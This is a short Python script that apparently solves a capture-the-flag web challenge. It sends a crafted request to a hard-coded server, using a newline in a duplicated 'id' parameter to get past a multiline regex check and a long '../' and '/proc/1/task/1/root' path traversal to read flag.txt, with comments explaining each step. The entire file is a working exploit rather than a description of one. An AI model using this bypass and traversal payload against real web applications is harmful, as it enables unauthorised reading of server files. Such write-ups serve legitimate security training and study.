import requests


BASE_URL = "http://154.57.164.80:31480"
# BASE_URL = "http://localhost:1337"


def solve():
    # It bypasses the regex filter by using a double "id=<val>" with a "\n" in the first "id", since the regex uses a
    # multiline mode with the anchors '^' and '$' that match the start end end of ANY line, not the entire string.
    # It then leverages a mix of "../" and a recursive path with "/proc/1/task/1/root" to meet the 100 character limit
    # and trim the path to the ".txt" extention.
    # The `path.join(...)` function collapses the array of "id=" into a single string, "splitted" by a comma.
    # For example, the array ["id=3", "id=../../.."] would be joined into the string "3,../../..".
    payload = "id=3\n&id=../../../../../../../../../../../../../../../../../../../../../proc/1/task/1/root/proc/1/task/1/root/flag.txt"
    response = requests.get(f"{BASE_URL}/api/team?{payload}")
    print(response.text)


if __name__ == "__main__":
    solve()
